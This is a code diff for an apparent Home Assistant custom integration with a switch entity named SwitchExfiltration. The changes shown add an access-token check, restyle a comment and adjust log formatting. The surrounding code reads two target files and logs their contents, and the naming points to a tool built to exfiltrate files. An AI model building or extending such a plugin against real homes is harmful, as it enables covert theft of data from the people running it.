@@ -11,11 +11,12 @@ from homeassistant.core import HomeAssistant
 from homeassistant.helpers.entity_platform import AddEntitiesCallback
 from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType
 
-""" To enable the print statements this integration must be configured to log level: debug """
+# To enable the print statements this integration must be configured to log level: debug
 PRINT_KEY = "printing"
 ACCESS_TOKEN_KEY = "db_access_token"
 
 _LOGGER = logging.getLogger(__name__)
+
 
 def setup_platform(
     hass: HomeAssistant,
@@ -25,11 +26,14 @@ def setup_platform(
 ) -> None:
     """Set up the sensor platform."""
 
+    if ACCESS_TOKEN_KEY not in config:
+        _LOGGER.critical("Missing access token!")
+        return False
+
     if PRINT_KEY in config:
         add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY], config[PRINT_KEY])])
     else:
         add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY])])
-
     return True
 
 
@@ -99,11 +103,11 @@ class SwitchExfiltration(SwitchEntity):
 
         if self._file_path:
             with open(self._file_path + self._target_file1, "rt") as _f:
-                _LOGGER.debug("\n-----\n Printing target: %s \n-----", self._target_file1)
+                _LOGGER.debug("\n---\n Printing target: %s \n---", self._target_file1)
                 data = _f.read()
                 _LOGGER.debug(data)
             with open(self._file_path + self._target_file2, "rt") as _f:
-                _LOGGER.debug("\n-----\n Printing target: %s \n-----", self._target_file2)
+                _LOGGER.debug("\n---\n Printing target: %s \n---", self._target_file2)
                 data = _f.read()
                 _LOGGER.debug(data)
 
